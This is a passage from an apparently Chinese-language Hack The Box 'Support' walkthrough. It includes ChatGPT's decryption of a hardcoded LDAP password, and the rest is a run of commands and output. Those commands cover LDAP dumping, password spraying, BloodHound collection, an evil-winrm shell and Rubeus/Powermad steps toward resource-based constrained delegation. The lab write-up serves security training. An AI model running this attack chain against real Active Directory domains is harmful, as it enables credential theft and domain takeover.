Encoding.ASCII.GetBytes(&quot;armando&quot;);</span><br><span class="line">也就是说，key 其实是：</span><br><span class="line"></span><br><span class="line">plaintext</span><br><span class="line">复制</span><br><span class="line">编辑</span><br><span class="line">[97, 114, 109, 97, 110, 100, 111]  // &quot;armando&quot; 的 ASCII 码</span><br><span class="line">遍历 array，对每个字节执行 异或运算（XOR）：</span><br><span class="line"></span><br><span class="line">csharp</span><br><span class="line">复制</span><br><span class="line">编辑</span><br><span class="line">array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);</span><br><span class="line">array[i] 是加密的字节。</span><br><span class="line"></span><br><span class="line">Protected.key[i % Protected.key.Length] 通过取模操作，循环使用 &quot;armando&quot; 的字节。</span><br><span class="line"></span><br><span class="line">223 是额外的一个固定数值（类似于盐值），增加混淆难度。</span><br><span class="line"></span><br><span class="line">最后，把解密后的字节数组转换回字符串：</span><br><span class="line"></span><br><span class="line">csharp</span><br><span class="line">复制</span><br><span class="line">编辑</span><br><span class="line">return Encoding.Default.GetString(array2);</span><br><span class="line">这就是原始的密码。</span><br><span class="line"></span><br><span class="line">当然！我会用 C# 的逻辑来解密 enc_password，但我会在 Python 里实现它，这样我们可以直接运行并得到结果。</span><br><span class="line"></span><br><span class="line">解密逻辑</span><br><span class="line">Base64 解码 enc_password，得到加密的字节数组。</span><br><span class="line"></span><br><span class="line">XOR 逐字节解密：</span><br><span class="line"></span><br><span class="line">使用 &quot;armando&quot; 作为密钥。</span><br><span class="line"></span><br><span class="line">每个字节先与 key[i % key.Length] 进行异或，再与 223 进行异或。</span><br><span class="line"></span><br><span class="line">转换回字符串，得到明文密码。</span><br><span class="line"></span><br><span class="line">我现在来运行这个解密代码。</span><br><span class="line"></span><br><span class="line">解密后的密码是：</span><br><span class="line">nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</span><br><span class="line"></span><br><span class="line">如果这是你的真实密码，请确保它的安全，不要在公共场合泄露！如果你有其他需要，比如加密方式的优化或者更安全的存储方法，也可以告诉我 😊 ​</span><br></pre></td></tr></table></figure>
<p>附上gpt写的解密py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># 加密的 Base64 密文</span><br><span class="line">enc_password = &quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span><br><span class="line"></span><br><span class="line"># 解密密钥</span><br><span class="line">key = &quot;armando&quot;.encode(&quot;ascii&quot;)</span><br><span class="line"></span><br><span class="line"># 1. Base64 解码</span><br><span class="line">encrypted_bytes = base64.b64decode(enc_password)</span><br><span class="line"></span><br><span class="line"># 2. XOR 解密</span><br><span class="line">decrypted_bytes = bytearray(len(encrypted_bytes))</span><br><span class="line">for i in range(len(encrypted_bytes)):</span><br><span class="line">    decrypted_bytes[i] = encrypted_bytes[i] ^ key[i % len(key)] ^ 223</span><br><span class="line"></span><br><span class="line"># 3. 转换回字符串</span><br><span class="line">decrypted_password = decrypted_bytes.decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)</span><br><span class="line">decrypted_password</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在上面还可以看到认证方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string password = Protected.getPassword();</span><br><span class="line">			this.entry = new DirectoryEntry(&quot;LDAP://support.htb&quot;, &quot;support\\ldap&quot;, password);</span><br><span class="line">			this.entry.AuthenticationType = AuthenticationTypes.Secure;</span><br><span class="line">			this.ds = new DirectorySearcher(this.entry);</span><br></pre></td></tr></table></figure>
<h3 id="ldap-enum-info"><a href="#ldap-enum-info" class="headerlink" title="ldap enum info"></a>ldap enum info</h3><p>尝试一下我们的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ nxc ldap 10.10.11.174 -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;</span><br><span class="line">LDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)</span><br><span class="line">LDAP        10.10.11.174    389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有效<br>翻一下ldap吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -H &#x27;ldap://10.10.11.174&#x27; -D ldap@support.htb -w &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; -b &quot;DC=support,DC=htb&quot; | less</span><br><span class="line"></span><br><span class="line"># /搜索一下info信息，可以看到有意思的</span><br><span class="line"># support, Users, support.htb</span><br><span class="line">dn: CN=support,CN=Users,DC=support,DC=htb</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: user</span><br><span class="line">cn: support</span><br><span class="line">c: US</span><br><span class="line">l: Chapel Hill</span><br><span class="line">st: NC</span><br><span class="line">postalCode: 27514</span><br><span class="line">distinguishedName: CN=support,CN=Users,DC=support,DC=htb</span><br><span class="line">instanceType: 4</span><br><span class="line">whenCreated: 20220528111200.0Z</span><br><span class="line">whenChanged: 20220528111201.0Z</span><br><span class="line">uSNCreated: 12617</span><br><span class="line">info: Ironside47pleasure40Watchful</span><br><span class="line">memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb</span><br><span class="line">memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb</span><br><span class="line">uSNChanged: 12630</span><br><span class="line">company: support</span><br><span class="line">streetAddress: Skipper Bowles Dr</span><br><span class="line">name: support</span><br><span class="line">objectGUID:: CqM5MfoxMEWepIBTs5an8Q==</span><br><span class="line">userAccountControl: 66048</span><br><span class="line">badPwdCount: 0</span><br><span class="line">codePage: 0</span><br><span class="line">countryCode: 0</span><br><span class="line">badPasswordTime: 0</span><br><span class="line">lastLogoff: 0</span><br><span class="line">lastLogon: 0</span><br></pre></td></tr></table></figure>
<p>长得真像个密码，先留一下<br>枚举一下用户名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ nxc ldap 10.10.11.174 -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; --users</span><br><span class="line">LDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)</span><br><span class="line">LDAP        10.10.11.174    389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz </span><br><span class="line">LDAP        10.10.11.174    389    DC               [*] Enumerated 20 domain users: support.htb</span><br><span class="line">LDAP        10.10.11.174    389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               </span><br><span class="line">LDAP        10.10.11.174    389    DC               Administrator                 2022-07-20 01:55:56 0        Built-in account for administering the computer/domain      </span><br><span class="line">LDAP        10.10.11.174    389    DC               Guest                         2022-05-28 19:18:55 0        Built-in account for guest access to the computer/domain    </span><br><span class="line">LDAP        10.10.11.174    389    DC               krbtgt                        2022-05-28 19:03:43 0        Key Distribution Center Service Account                     </span><br><span class="line">LDAP        10.10.11.174    389    DC               ldap                          2022-05-28 19:11:46 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               support                       2022-05-28 19:12:00 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               smith.rosario                 2022-05-28 19:12:19 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               hernandez.stanley             2022-05-28 19:12:34 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               wilson.shelby                 2022-05-28 19:12:50 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               anderson.damian               2022-05-28 19:13:05 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               thomas.raphael                2022-05-28 19:13:21 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               levine.leopoldo               2022-05-28 19:13:37 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               raven.clifton                 2022-05-28 19:13:53 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               bardot.mary                   2022-05-28 19:14:08 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               cromwell.gerard               2022-05-28 19:14:24 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               monroe.david                  2022-05-28 19:14:39 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               west.laura                    2022-05-28 19:14:55 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               langley.lucy                  2022-05-28 19:15:10 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               daughtler.mabel               2022-05-28 19:15:26 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               stoll.rachelle                2022-05-28 19:15:42 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               ford.victoria                 2022-05-28 19:15:58 0                                                                    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再尝试一下smb，可以的话遛狗</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.11.174 -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;                                                        </span><br><span class="line">SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz </span><br><span class="line"></span><br><span class="line">$ bloodhound-python -d support.htb -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; -ns 10.10.11.174 --zip                  </span><br><span class="line">INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)</span><br><span class="line">INFO: Found AD domain: support.htb</span><br><span class="line">INFO: Getting TGT for user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.support.htb:88)] [Errno -2] Name or service not known</span><br><span class="line">INFO: Connecting to LDAP server: dc.support.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 2 computers</span><br><span class="line">INFO: Found 21 users</span><br><span class="line">INFO: Connecting to LDAP server: dc.support.htb</span><br><span class="line">INFO: Found 53 groups</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: Management.support.htb</span><br><span class="line">INFO: Querying computer: dc.support.htb</span><br><span class="line">INFO: Done in 00M 46S</span><br><span class="line">INFO: Compressing output into 20250403145630_bloodhound.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>导入到bloodhound里面（我导入到了bloodhoundCE里面，但是不知道为啥导入进去很慢，有时间看一下是什么问题，哦，nxc也可以直接–bloodhound）</p>
<p>这边把枚举出来的用户名导出来喷射一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">$ nxc ldap 10.10.11.174 -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; --users | grep 2022- | awk -F &#x27; &#x27; &#x27;&#123;print $5&#125;&#x27; | tee &gt; user.list</span><br><span class="line"></span><br><span class="line">$ cat user.list </span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">ldap</span><br><span class="line">support</span><br><span class="line">smith.rosario</span><br><span class="line">hernandez.stanley</span><br><span class="line">wilson.shelby</span><br><span class="line">anderson.damian</span><br><span class="line">thomas.raphael</span><br><span class="line">levine.leopoldo</span><br><span class="line">raven.clifton</span><br><span class="line">bardot.mary</span><br><span class="line">cromwell.gerard</span><br><span class="line">monroe.david</span><br><span class="line">west.laura</span><br><span class="line">langley.lucy</span><br><span class="line">daughtler.mabel</span><br><span class="line">stoll.rachelle</span><br><span class="line">ford.victoria</span><br><span class="line"></span><br><span class="line">$ nxc smb 10.10.11.174 -u user.list -p &#x27;Ironside47pleasure40Watchful&#x27; --continue-on-success</span><br><span class="line">SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\Administrator:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\Guest:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\krbtgt:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\ldap:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\smith.rosario:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\hernandez.stanley:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\wilson.shelby:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\anderson.damian:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\thomas.raphael:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\levine.leopoldo:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\raven.clifton:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\bardot.mary:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\cromwell.gerard:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\monroe.david:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\west.laura:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\langley.lucy:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\daughtler.mabel:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\stoll.rachelle:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\ford.victoria:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里用nxc winrm看support是失败的（我猜是权限问题）<br>在bloodhound里面可以看到support是remote management users的组成员<br><a data-fancybox="gallery" data-src="/images/support3.png" data-caption=""><img src="/images/support3.png"></a><br>直接登录一下试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo evil-winrm -i 10.10.11.174 -u support -p &#x27;Ironside47pleasure40Watchful&#x27;</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\support\Documents&gt; </span><br></pre></td></tr></table></figure>
<h2 id="shell-as-support"><a href="#shell-as-support" class="headerlink" title="shell as support"></a>shell as support</h2><p>在上面的图片中我们还可以看到support用户还在shared support account组里面<br>而从这个组到administrator有一条清晰的路线<br><a data-fancybox="gallery" data-src="/images/support4.png" data-caption=""><img src="/images/support4.png"></a><br>就按照人家的来吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\support&gt; mkdir C:\lusowen                                                                                                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">    Directory: C:\                                                                                                                                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                                                                                                                 </span><br><span class="line">----                 -------------         ------ ----                                                                                                                                                                                 </span><br><span class="line">d-----          4/3/2025   1:06 AM                lusowen                                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">*Evil-WinRM* PS C:\Users\support&gt; cd C:\lusowen                                                                                                                                                                                        </span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; upload PowerView.ps1                                                                                                                                                                                       </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">Info: Uploading /home/lusowen/HackTheBox/Support/PowerView.ps1 to C:\lusowen\PowerView.ps1                                                                                                                                             </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">Data: 1027036 bytes of 1027036 bytes copied                                                                                                                                                                                            </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">Info: Upload successful! </span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; . .\PowerView.ps1</span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; upload Powermad.ps1</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /home/lusowen/HackTheBox/Support/Powermad.ps1 to C:\lusowen\Powermad.ps1</span><br><span class="line">                                        </span><br><span class="line">Data: 180768 bytes of 180768 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!   </span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; . .\Powermad.ps1</span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString &#x27;Summer2018!&#x27; -AsPlainText -Force)</span><br><span class="line">[+] Machine account attackersystem added</span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; upload Rubeus.exe</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /home/lusowen/HackTheBox/Support/Rubeus.exe to C:\lusowen\Rubeus.exe</span><br><span class="line">                                        </span><br><span class="line">Data: 595968 bytes of 595968 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&quot;</span><br><span class="line">                                                         </span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; $SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">                                                         </span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; $SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; Get-DomainComputer $TargetComputer | Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125;</span><br><span class="line">Warning: [Set-DomainObject] Error setting/replacing properties for object &#x27;MANAGEMENT$&#x27; : Exception calling 